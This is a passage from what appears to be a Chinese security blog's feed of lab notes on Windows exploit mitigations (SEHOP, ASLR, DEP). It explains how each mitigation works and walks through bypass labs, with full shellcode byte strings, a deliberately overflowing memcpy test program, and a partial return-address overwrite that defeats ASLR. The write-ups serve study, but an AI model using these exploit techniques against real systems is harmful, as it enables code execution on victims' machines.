class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">// the fake seh record</span></span><br><span class="line">    <span class="string">&quot;\x75\xA8\xF7\x77&quot;</span></span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>编译运行，就能看到 ”failwest“ 对话框了。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628175704598.png" alt="image-20220628175704598"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;sehop-的原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#sehop-的原理&quot;&gt;&lt;/a&gt; SEHOP 的原理&lt;/h1&gt;
&lt;p&gt;SEHOP（Structured Exception Handling Ov</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="SEHOP" scheme="https://www.rgzzplus.com/tags/SEHOP/"/>
    
  </entry>
  
  <entry>
    <title>在内存中躲猫猫：ASLR</title>
    <link href="https://www.rgzzplus.com/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/"/>
    <id>https://www.rgzzplus.com/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/</id>
    <published>2022-06-27T14:05:51.000Z</published>
    <updated>2022-08-01T11:17:02.414Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="内存随机化保护机制的原理"><a class="markdownIt-Anchor" href="#内存随机化保护机制的原理"></a> 内存随机化保护机制的原理</h1><p>前面的所有漏洞利用都有一个共同特征：都需要确定一个明确的跳转地址。而 ASLR（Address Space Layout Randomization）技术就是通过使用随机的基址加载程序，从而干扰 shellcode 定位的一种保护机制。</p><p>ASLR 的实现需要程序和操作系统的双重支持，其中程序的支持不是必需的。</p><p>支持 ASLR 的程序在它的 PE 头中会设置 IMAGE_DLL_CHARACTERISTICS_ DYNAMIC_BASE 标识来说明其支持 ASLR。在Visual Studio 2008 (VS 9.0)中，可以在通过菜单中的 Project→project Properties→ Configuration Pr operties→ Linker→ Advanced→ Randomized Base Address 选项对 /dynmicbase 链接选项（启用则支持 ASLR）进行设置。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627142527023.png" alt="image-20220627142527023"></p><h2 id="映像随机化"><a class="markdownIt-Anchor" href="#映像随机化"></a> 映像随机化</h2><p>映像随机化是在 PE 文件映射到内存时，对其加载的虚拟地址进行随机化处理，这个地址是在系统启动时确定的，系统重启后这个地址会变化。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627144723028.png" alt="image-20220627144723028"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627144842009.png" alt="image-20220627144842009"></p><p>微软在系统中设置了映像随机化的开关，通过设置注册表中 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\MoveImages 的键值来设定映像随机化的工作模式。</p><ul><li>设置为 0 时映像随机化将禁用。</li><li>设置为 -1 时强制对可随机化的映像进行处 理，无论是否设置 IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE 标识。</li><li>设置为其他值时为正常工作模式，只对具有随机化处理标识的映像进行处理。</li></ul><p>如果注册表中不存在 MoveImages，大家可以手工建立名称为 MoveImages，类型为 DWORD的值，并根据需要设置它的值，如下图所示。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627182404503.png" alt="image-20220627182404503"></p><h2 id="堆栈随机化"><a class="markdownIt-Anchor" href="#堆栈随机化"></a> 堆栈随机化</h2><p>堆栈随机化是在程序运行时随机的选择堆栈的基址，在程序打开时确定。也就是说同一个程序任意两次运行时的堆栈基址都是不同的，进而各变量在内存中的位置也就是不确定的。</p><p>测试一下<strong>堆栈随机化对变量在内存位置的影响</strong>，我们分别在堆和栈上各申请 100 个字节的空间，然后在 Windows XP 和 Windows Vista 下面各运行两次。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> * heap=(<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="type">char</span> <span class="built_in">stack</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of heap:%#0.4x\nAddress of stack:%#0.4x&quot;</span>,heap, <span class="built_in">stack</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Windows vista：两次申请空间的起始地址不同</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627143210755.png" alt="vista 第一次"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627143302842.png" alt="vista 第二次"></p><p>Windows XP：两次申请空间的起始地址完全相同</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627143735236.png" alt="image-20220627143735236"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627143752943.png" alt="image-20220627143752943"></p><h2 id="peb-与-teb-随机化"><a class="markdownIt-Anchor" href="#peb-与-teb-随机化"></a> PEB 与 TEB 随机化</h2><p>微软在 XP SP2 之后不再使用固定的 PEB 基址 0x7FFDF000 和 TEB 基址 0x7FFDE000，而是使用具有一定随机性的基址，这就增加了攻击 PEB 中的函数指针的难度。</p><p>获取当前进程的 TEB 和 PEB ，TEB 存放在 FS:0 和 FS:[0x18]处， PEB 存放在 TEB 偏移 0x30 的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> teb;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> peb;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov eax,FS:[<span class="number">0x18</span>]</span><br><span class="line">        mov teb,eax</span><br><span class="line">        mov eax,dwordptr[eax+<span class="number">0x30</span>]</span><br><span class="line">        mov peb,eax</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PEB:%#x\nTEB:%#x&quot;</span>,peb,teb);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以从下面的结果看出，PEB 和 TEB 的随机效果不是很好。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627145731792.png" alt="image-20220627145731792"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627145754255.png" alt="image-20220627145754255"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627145818499.png" alt="image-20220627145818499"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627145834839.png" alt="image-20220627145834839"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627145849099.png" alt="image-20220627145849099"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627145904247.png" alt="image-20220627145904247"></p><h2 id="aslr-的弱点"><a class="markdownIt-Anchor" href="#aslr-的弱点"></a> ASLR 的弱点</h2><p>（1）在映像随机化中，虽然模块的加载基址变化了，但是<strong>各模块的入口点（ Entry 那列）地址的低位 2 个字节是不变的</strong>，也就是说映像随机化只是对加载基址的前 2 个字节做了随机处理。<strong>地址的前 2 个字节是随机的，而后 2 个字节是固定的。</strong></p><p>（2）在堆栈随机化中，将每个线程的堆栈基址都做了随机化处理，使得<strong>程序每次运行时变量的地址都不相同</strong>。好处是可以防止精准攻击。例如我们需要根据 shellcode 的起始地址直接跳转到 shellcode 执行，但是自从 JMP ESP 跳板指令开始使用后溢出时很少直接跳到 shellcode 中执行了；另外在浏览器攻击方面很流行的 heap spray 等技术，这些技术也是<strong>不需要精准跳转的，只需要跳转到一个大概的位置即可</strong>。所以这项措施对于目前的溢出手段影响有限。</p><p>（3）在PEB 和 TEB 的随机化中，它们的随机化程度很低。</p><h1 id="攻击未启用-aslr-的模块"><a class="markdownIt-Anchor" href="#攻击未启用-aslr-的模块"></a> 攻击未启用 ASLR 的模块</h1><p>ASLR 仅仅是项安全机制，不是什么行业标准， 不支持 ASLR 的软件有很多。不支持 ASLR 意味着加载基址固定，如果我们能够在当前进程空间中找到一个这样的模块，就可以利用它里边的指令来做跳板了，直接无视 ASLR。</p><p>本次实验需要用到 IE 和 Flash，由于这两项技术目前已经淘汰，并且 Flash无法找到实验版本（Flash Player ActiveX 9.0.262），所以我们先跳过这个实验。</p><h1 id="利用部分覆盖进行定位内存地址"><a class="markdownIt-Anchor" href="#利用部分覆盖进行定位内存地址"></a> 利用部分覆盖进行定位内存地址</h1><p>之所以能利用部分覆盖进行定位内存地址，有两个原因，一是**映像随机化只是对映像加载基址的前2个字节做随机化处理。**如果我们借鉴 “off by one” 的思想，只覆盖这个地址的最后一个字节（或者两个字节），那么我们就能在一定范围内控制程序。二是因为 <strong>ASLR 只是随机化了映像的加载基址，而没有对指令序列进行随机化</strong>，指令序列相对于基址的位置还是不变的。</p><h2 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码"></a> 实验代码：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line">charshellcode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x1C\x14&quot;</span></span><br><span class="line">;</span><br><span class="line"><span class="type">char</span> * <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> tt[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(tt,shellcode,<span class="number">262</span>);</span><br><span class="line">    <span class="keyword">return</span> tt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验思路"><a class="markdownIt-Anchor" href="#实验思路"></a> 实验思路：</h2><p>（ 1）为了更直观地反映绕过 ASLR 的过程，本次实验编译的程序<strong>不启用 GS</strong>。<br>（ 2）编译程序时<strong>禁用 DEP</strong>。<br>（ 3） test 函数中通过复制超长字符串可以溢出并覆盖函数返回地址。<br>（ 4）复制结束后， <strong>test 函数返回 tt 字符数组的首地址</strong>。<br>（ 5）在相对程序加载基址 0x0000~0xFFFF 的范围内，找到一条<strong>跳板指令</strong>，并<strong>用它地址的后 2 个字节覆盖返回地址的后两个字节。</strong><br>（ 6）采用这种类似 <strong>“相对寻址”</strong> 的方法来动态确定跳板指令的地址，以实现跳板指令的通用性。</p><blockquote><p>注意：test 函数返回的 tt 字符数组的首地址是没有实际意义的，因为 tt 的空间是在栈上的，程序从 test 函数返回后 tt 字符数组所在的空间就会被释放。</p></blockquote><table><thead><tr><th></th><th>推荐使用的环境</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows Vista SP2</td></tr><tr><td>DEP 状态</td><td>Optin （Vista 默认状态）</td></tr><tr><td>编译器</td><td>Visual Studio 2008</td></tr><tr><td>优化选项</td><td>禁用优化选项</td></tr><tr><td>GS 选项</td><td>GS 关闭</td></tr><tr><td>DEP 选项</td><td>/NXCOMPAT:NO</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><h2 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤：</h2><h3 id="计算能覆盖到返回地址的填充长度"><a class="markdownIt-Anchor" href="#计算能覆盖到返回地址的填充长度"></a> 计算能覆盖到返回地址的填充长度</h3><p>调试得到，test() 的返回地址位于 001FF940处，tt 的起始地址位于 0x001FF83C处，相距 260 个字节，所以我们可以使用 261~262 这两个字节来覆盖返回地址的后两位。</p><h3 id="寻找跳板指令"><a class="markdownIt-Anchor" href="#寻找跳板指令"></a> 寻找跳板指令</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90&quot;</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627183840453.png" alt="image-20220627183840453"></p><p>如上图所示，函数返回地址的后两个字节已经被覆盖为 0x90 了。接下来就是寻找一条适合的跳板地址，由于是部分覆盖，所以 shellcode 只能放在返回地址前面，这样 JMP ESP 指令就不能再使用了。我们需要让函数跳转执行 shellcode，所以要向低地址跳转，观察寄存器，只有EAX 符合（EAX 指向 tt 的起始地址）。将函数返回地址覆盖为 CALL/JMP EAX 的指令地址（0x00b7141c）。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627210954342.png" alt="image-20220627210954342"></p><p>选择 ASLR_Offbyone.exe 中的指令，因为只有它里面的指令才有可能控制，我们选择 0x0008141C，重启系统后再查找一次。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627211702027.png" alt="image-20220627211702027"></p><h3 id="布置-shellcode"><a class="markdownIt-Anchor" href="#布置-shellcode"></a> 布置 shellcode</h3><p>Shellcode 最开始部分为弹出对话框的机器码，然后是 0x90 填充，最后为用来覆盖返回地址后 2 个字节的 0x141C。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627212644231.png" alt="image-20220627212644231"></p><figure class="highlight v"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">char shellcode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x1C\x14&quot;</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>运行成功，即使是重启系统，shellcode 依然能成功执行。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627214549655.png" alt="image-20220627214549655"></p><h1 id="利用-heap-spray-技术定位内存"><a class="markdownIt-Anchor" href="#利用-heap-spray-技术定位内存"></a> 利用 Heap spray 技术定位内存</h1><p>Heap spray 原理：通过申请大量内存，占领内存中的 0x0C0C0C0C 的位置，并在这些内存中放置 0x90 和 shellcode，最后控制程序转入 0x0C0C0C0C 执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;内存随机化保护机制的原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#内存随机化保护机制的原理&quot;&gt;&lt;/a&gt; 内存随机化保护机制的原理&lt;/h1&gt;
&lt;p&gt;前面的所有漏洞利用都有一个共同特征：都需要确定一个明确的跳</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="ASLR" scheme="https://www.rgzzplus.com/tags/ASLR/"/>
    
  </entry>
  
  <entry>
    <title>数据与程序的分水岭:DEP</title>
    <link href="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/"/>
    <id>https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/</id>
    <published>2022-06-27T01:21:00.000Z</published>
    <updated>2022-08-01T10:31:30.860Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="dep-机制的保护原理"><a class="markdownIt-Anchor" href="#dep-机制的保护原理"></a> DEP 机制的保护原理</h1><p>溢出攻击的<strong>根源</strong>在于计算机未明确区分数据和代码，DEP（数据执行保护，Data Execution Prevention）的<strong>基本原理</strong>就是将数据所在页面标识为不可执行。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618160130800-16562939498331.png" alt="image-20220618160130800"></p><h2 id="dep-的主要作用"><a class="markdownIt-Anchor" href="#dep-的主要作用"></a> <strong>DEP 的主要作用</strong>：</h2><p>阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。</p><p>根据实现的机制不同可分为：软件DEP（Software DEP）和硬件DEP（Hardware-enforced DEP）</p><p><strong>软件DEP</strong>就是SafeSEH，阻止利用 S.E.H 的攻击。</p><p><strong>硬件DEP</strong>需要CPU支持，AMD 称之为 No-Execute Page-Protection（NX），Intel 称之为 Execute Disable Bit（XD）。</p><p>操作系统通过设置内存页的 <strong>NX/XD 属性标记</strong>，来指明不能从该内存执行代码。内存的页面表（Page Table）中的标识位（NX/XD）来标识是否允许在该页上执行指令。标识位为 0 表示这个页面允许执行指令，设置为 1 表示该页面不允许执行指令。</p><h2 id="dep-工作状态"><a class="markdownIt-Anchor" href="#dep-工作状态"></a> <strong>DEP 工作状态：</strong></h2><p>（1）Option：默认仅将 DEP 保护应用于 Windows 系统组件和服务。但用户可以通过应用程序兼容性工具(ACT， Application Compatibility Toolkit)为选定的程序启用 DEP。DEP 可被程序动态关闭。</p><p>（2）Optout：为排除列表程序外的所有程序和服务启用 DEP，用户可以手动在排除列表中指定不启用 DEP 保护的程序和服务。DEP 可被应用程序动态关闭。</p><p>（3）AlwaysON：对所有进程启用 DEP 保护，不存在排序列表，DEP 不可被关闭。</p><p>（4）AlwaysOff：对所有进程禁用 DEP，DEP 不能动态开启。</p><h2 id="和-dep-密切相关的程序链接选项nxcompat"><a class="markdownIt-Anchor" href="#和-dep-密切相关的程序链接选项nxcompat"></a> <strong>和 DEP 密切相关的程序链接选项</strong>：/NXCOMPAT</h2><p>在Visual Studio 2008 ( VS 9.0)中，可以在通过菜单中的 Project→<br>project Properties → Configuration Properties→ Linker→ Advanced→ Data Execution Prevention(DEP)中选择是不是使用/NXCOMPAT 编译程序，如下图所示。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618165748260-16562939498342.png" alt="image-20220618165748260"></p><p>采用/NXCOMPAT 编译的程序会在文件的 PE 头中设置 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 标识，该标识通过结构体 IMAGE_OPTIONAL_HEADER 中的 DllCharacteristics 变量进行体现，<strong>当 DllCharacteristics 设置为 0x0100 表示该程序采用了/NXCOMPAT 编译</strong>。</p><p>操作系统中 DEP 一般工作在 